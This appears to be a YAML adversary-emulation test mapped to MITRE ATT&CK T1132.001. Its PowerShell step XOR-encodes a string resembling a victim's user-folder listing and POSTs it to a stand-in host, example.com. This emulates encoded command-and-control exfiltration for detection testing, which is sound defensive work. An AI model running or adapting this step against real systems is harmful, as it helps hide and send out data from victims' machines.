api_version: "2.0"
name: XOR Encoded data.
description: |
    XOR encodes the data with a XOR key.
    Reference - https://gist.github.com/loadenmb/8254cee0f0287b896a05dcdc8a30042f
args:
    - name: destination_url
      type: url
      default: example.com
    - name: plaintext
      type: string
      default: Path\n----\nC:\Users\victim
    - name: key
      type: string
      default: abcdefghijklmnopqrstuvwxyz123456
uuid: c3ed6d2a-e3ad-400d-ad78-bbfdbfeacc08
mitre:
    tactics:
        - 'TA0011: Command and Control'
    techniques:
        - 'T1132: Data Encoding'
    subtechniques:
        - 'T1132.001: Standard Encoding'
requirements:
    platforms:
        - os: windows
steps:
    - name: xor-encoded-data.
      inline: |
        $plaintext = ([system.Text.Encoding]::UTF8.getBytes("{{.Args.plaintext}}"))
        $key = "{{.Args.key}}"
        $cyphertext =  @();
        for ($i = 0; $i -lt $plaintext.Count; $i++) {
         $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length];
        }
        $cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext)
        [System.Net.ServicePointManager]::Expect100Continue = $false
        Invoke-WebRequest -Uri {{.Args.destination_url}} -Method POST -Body $cyphertext -DisableKeepAlive
      executor: powershell
      cleanup:
        inline: ""
        executor: powershell
